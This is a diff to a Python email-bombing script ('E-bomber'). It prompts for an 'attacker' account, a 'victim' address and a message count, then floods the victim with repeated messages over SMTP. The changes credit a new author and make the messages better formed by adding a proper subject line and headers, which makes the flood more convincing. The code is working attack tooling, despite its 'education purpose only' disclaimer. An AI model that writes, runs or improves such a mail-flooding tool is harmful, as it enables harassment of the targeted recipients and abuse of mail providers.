@@ -2,10 +2,11 @@
 #E-bomber
 #This code for education purpose only.
 #Use it at your own risk !!!
-# Python 3 rewrite by Omicron166
+# Better Python Rewrite by Noctornal-Compiler
 
 from os import urandom
 import smtplib
+from email.message import EmailMessage
 from getpass import getpass
 from simple_chalk import chalk, green
 import sys
@@ -31,6 +32,7 @@ passwd = getpass(chalk.green.bold('\n[3] ----> Attacker Email Password: '))
 to = input(chalk.red('\n[4] ----> Victim Email Address: '))
 total = input(chalk.blue('\n[5] ----> Number of emails: '))
 body = input(chalk.blue('\n[6] ----> Message: '))
+subject = input(chalk.blue('\n[7] ----> [Title Of The Email] Subject: '))
 Cserver = input(chalk.red('\n[+] Custom smtp server (leave blank to use gmail): '))
 
 if not Cserver == '':
@@ -53,9 +55,12 @@ try:
     server.starttls()
     server.login(email, passwd)
     for i in range(1, int(total) + 1):
-        subject = urandom(9)
-        msg = 'From: ' + user + '\nMessage: ' + '\n' + body
-        server.sendmail(email, to, msg)
+        msg = EmailMessage()
+        msg['Subject'] = subject
+        msg['From'] = email
+        msg['To'] = to
+        msg.set_content(body)
+        server.send_message(msg)
         print(chalk.green.bold("\r[+] E-mails sent: %i" % i))
         sleep(1)
         sys.stdout.flush()
